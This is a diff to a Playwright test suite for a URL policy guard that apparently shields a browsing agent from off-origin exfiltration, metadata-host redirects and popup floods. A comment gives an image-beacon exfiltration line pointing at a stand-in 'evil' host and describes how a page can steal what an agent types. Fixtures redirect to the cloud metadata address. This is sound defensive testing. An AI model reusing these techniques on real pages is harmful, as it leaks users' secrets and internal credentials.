@@ -19,7 +19,12 @@ import { AddressInfo } from 'net';
 import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
-import { installUrlPolicyGuard, guardedGoto, observeGuardDecisions } from '../src/url-policy-guard';
+import {
+  installUrlPolicyGuard,
+  guardedGoto,
+  observeGuardDecisions,
+  MAX_POPUPS_PER_CONTEXT,
+} from '../src/url-policy-guard';
 import type { GuardDecision } from '../src/url-policy-guard';
 
 const METADATA = 'http://169.254.169.254/latest/meta-data/';
@@ -53,6 +58,7 @@ describe('URL policy guard', () => {
         '/loop': '/loop',
         '/img-to-metadata': METADATA,
         '/img-to-real': '/pixel',
+        '/to-offsite-tab': `${OFFSITE}/escaped`,
       };
       if (redirects[url]) {
         res.writeHead(302, { Location: redirects[url] });
@@ -88,7 +94,12 @@ describe('URL policy guard', () => {
           page(
             'Popup source',
             `<a id="same" target="_blank" href="/final">same</a>` +
-              `<a id="off" target="_blank" href="${OFFSITE}/tab">off</a>`,
+              `<a id="off" target="_blank" href="${OFFSITE}/tab">off</a>` +
+              // Same-origin opening requests that only leave via a redirect (#337).
+              `<a id="redir-off" target="_blank" href="/to-offsite-tab">redir-off</a>` +
+              `<a id="redir-meta" target="_blank" href="/to-metadata">redir-meta</a>` +
+              `<a id="redir-ok" target="_blank" href="/to-final">redir-ok</a>` +
+              `<button id="many" onclick="for (let i = 0; i < ${MAX_POPUPS_PER_CONTEXT + 2}; i++) window.open('/final?popup=' + i)">many</button>`,
           ),
         );
       }
@@ -380,11 +391,11 @@ describe('URL policy guard', () => {
       await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/private\/loopback/);
     }, 60_000);
 
-    it('pins active cross-origin requests but not passive ones', async () => {
-      // fetch/XHR/websocket carry data off-origin and return readable
-      // responses, so a same-origin click that fires one is an exfiltration
-      // channel the per-action check cannot see. Images and fonts are not —
-      // refusing those would break the page the agent is trying to read.
+    it('pins every cross-origin sub-resource, passive ones included (#337)', async () => {
+      // fetch/XHR carry data off-origin and return readable responses. An image
+      // returns nothing readable, but its URL is still a write channel: a page
+      // that injects <img src="https://evil/?c=<filled secret>"> after the agent
+      // types into a form has exfiltrated it the moment the request leaves.
       await installUrlPolicyGuard(p, { pinnedOrigin: origin });
 
       await guardedGoto(p, `${origin}/exfil`, { waitUntil: 'networkidle' });
@@ -392,10 +403,18 @@ describe('URL policy guard', () => {
       await expect(
         p.evaluate(() => (window as unknown as { probe: Promise<string> }).probe),
       ).resolves.toBe('blocked');
-      // The passive image still went out, so this is a targeted limit rather
-      // than "refuse everything cross-origin".
-      expect(offsiteLog).toContain('/pixel.gif');
+      expect(offsiteLog).not.toContain('/pixel.gif');
       expect(offsiteLog).not.toContain('/steal?c=secret');
+    }, 60_000);
+
+    it('leaves cross-origin sub-resources alone when nothing is pinned', async () => {
+      // The positive control: the image above is refused by the pin, not by
+      // anything else in the guard.
+      await installUrlPolicyGuard(p, {});
+
+      await guardedGoto(p, `${origin}/exfil`, { waitUntil: 'networkidle' });
+
+      expect(offsiteLog).toContain('/pixel.gif');
     }, 60_000);
 
     it('pins a cross-origin script, which is code execution not a static asset', async () => {
@@ -517,10 +536,7 @@ describe('URL policy guard', () => {
       expect(outcome).toBe('close 1008');
     }, 60_000);
 
-    it('does NOT block cross-origin sub-resources', async () => {
-      // Pinning is a navigation control. A page legitimately loads images and
-      // fonts from other origins, and refusing those would break the very page
-      // the agent is trying to read.
+    it('still loads same-origin sub-resources under a pin', async () => {
       await installUrlPolicyGuard(p, { pinnedOrigin: origin });
 
       await guardedGoto(p, `${origin}/subresource-ok`, { waitUntil: 'networkidle' });
@@ -636,6 +652,69 @@ describe('URL policy guard', () => {
       await popup.waitForTimeout(1500);
 
       expect(offsiteLog).not.toContain('/from-popup');
+    }, 60_000);
+
+    // #337: the context route sees a popup's opening request but never its
+    // redirect hops — Playwright continues those itself — and the popup's own
+    // CDP session attaches too late to catch them. A same-origin link that
+    // 302s elsewhere walked straight past both.
+    it('blocks a popup whose same-origin opening request redirects off the pinned origin', async () => {
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+      await guardedGoto(p, `${origin}/popup-source`);
+
+      await p.click('#redir-off').catch(() => {});
+      await p.waitForTimeout(2000);
+
+      // The opening request was allowed and made; only the hop was refused.
+      expect(requestLog).toContain('/to-offsite-tab');
+      expect(offsiteLog).not.toContain('/escaped');
+    }, 60_000);
+
+    it('refuses a popup redirect to a metadata host, judged by the opener policy', async () => {
+      const decisions: GuardDecision[] = [];
+      observeGuardDecisions((d) => decisions.push(d));
+      try {
+        await installUrlPolicyGuard(p, {});
+        await guardedGoto(p, `${origin}/popup-source`);
+
+        await p.click('#redir-meta').catch(() => {});
+        await p.waitForTimeout(2000);
+      } finally {
+        observeGuardDecisions();
+      }
+
+      // The metadata address is unreachable from CI anyway, so assert the
+      // refusal itself rather than the absence of a response.
+      const hop = decisions.find((d) => d.url === METADATA && d.attribution === 'opener');
+      expect(hop).toMatchObject({ allowed: false, policies: [{}] });
+      expect(hop?.reason).toMatch(/metadata/);
+    }, 60_000);
+
+    it('still lands a popup whose redirect stays in policy', async () => {
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+      await guardedGoto(p, `${origin}/popup-source`);
+
+      const [popup] = await Promise.all([
+        p.context().waitForEvent('page', { timeout: 15_000 }),
+        p.click('#redir-ok'),
+      ]);
+      await popup.waitForLoadState('load').catch(() => {});
+
+      expect(popup.url()).toBe(`${origin}/final`);
+    }, 60_000);
+
+    it('closes popups past the per-context cap before their requests go out', async () => {
+      // Every popup is a renderer and a guard session of its own; a page that
+      // opens them in a loop must not get to open them without bound.
+      await installUrlPolicyGuard(p, {});
+      await guardedGoto(p, `${origin}/popup-source`);
+
+      await p.click('#many');
+      await p.waitForTimeout(3000);
+
+      const opened = requestLog.filter((u) => u.startsWith('/final?popup='));
+      expect(opened).toHaveLength(MAX_POPUPS_PER_CONTEXT);
+      expect(context.pages()).toHaveLength(1 + MAX_POPUPS_PER_CONTEXT);
     }, 60_000);
   });
 
